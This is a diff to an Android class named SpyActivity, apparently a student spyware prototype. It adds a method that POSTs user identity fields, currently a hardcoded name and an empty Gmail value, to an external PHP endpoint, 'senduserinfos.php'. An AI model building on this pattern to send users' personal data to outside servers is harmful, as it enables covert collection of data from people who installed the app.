@@ -5,12 +5,22 @@ import java.io.File;
 import java.io.FileInputStream;
 import java.io.IOException;
 import java.net.HttpURLConnection;
-import java.net.MalformedURLException;
 import java.net.URL;
+import java.util.ArrayList;
+import java.util.List;
+
+import org.apache.http.HttpResponse;
+import org.apache.http.NameValuePair;
+import org.apache.http.client.ClientProtocolException;
+import org.apache.http.client.HttpClient;
+import org.apache.http.client.entity.UrlEncodedFormEntity;
+import org.apache.http.client.methods.HttpPost;
+import org.apache.http.impl.client.DefaultHttpClient;
+import org.apache.http.message.BasicNameValuePair;
 
 import android.app.Activity;
 import android.os.Bundle;
-import android.util.Log;
+import android.os.Looper;
 import android.view.Menu;
 import android.view.View;
 import android.widget.Button;
@@ -28,13 +38,20 @@ public class SpyActivity extends Activity {
 		final SpyActivity zis = this;
 		sendButton.setOnClickListener(new View.OnClickListener() {
 		    public void onClick(View view) {
-		    	try {
-		            upload();
-		            Toast.makeText(zis, "Upload suceeded", Toast.LENGTH_LONG).show();
-		        } catch (Exception e) {
-		            Toast.makeText(zis, "ERREUR: "+e.toString(), Toast.LENGTH_LONG).show();  
-		            e.printStackTrace();
-		        }
+		            //upload();
+		    		Thread t = new Thread(new Runnable() {
+						public void run() {
+							Looper.prepare();
+							try {
+								uploadUtilisateur();
+								Toast.makeText(zis, "Upload suceeded", Toast.LENGTH_LONG).show();
+					        } catch (Exception e) {
+					            Toast.makeText(zis, "ERREUR: "+e.toString(), Toast.LENGTH_LONG).show();  
+					            e.printStackTrace();
+					        }
+						}
+					});
+		    		t.start();
 		    }
 		});
 	}
@@ -45,6 +62,34 @@ public class SpyActivity extends Activity {
 		getMenuInflater().inflate(R.menu.main, menu);
 		return true;
 	}
+	
+	public void uploadUtilisateur() throws Exception {
+		// Create a new HttpClient and Post Header
+	    HttpClient httpclient = new DefaultHttpClient();
+	    HttpPost httppost = new HttpPost("http://uqac.netii.net/senduserinfos.php");
+
+	    try {
+	        // Add your data
+	        List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);
+	        nameValuePairs.add(new BasicNameValuePair("nom", "Sylvain"));
+	        nameValuePairs.add(new BasicNameValuePair("gmail", "<contact></contact>"));
+	        httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
+
+	        // Execute HTTP Post Request
+	        HttpResponse response = httpclient.execute(httppost);
+
+	    } catch (ClientProtocolException e) {
+	        // TODO Auto-generated catch block
+	    } catch (IOException e) {
+	        // TODO Auto-generated catch block
+	    }
+    }
+	
+	
+	
+	
+	
+	
 	
 	
 	public void upload() throws Exception {
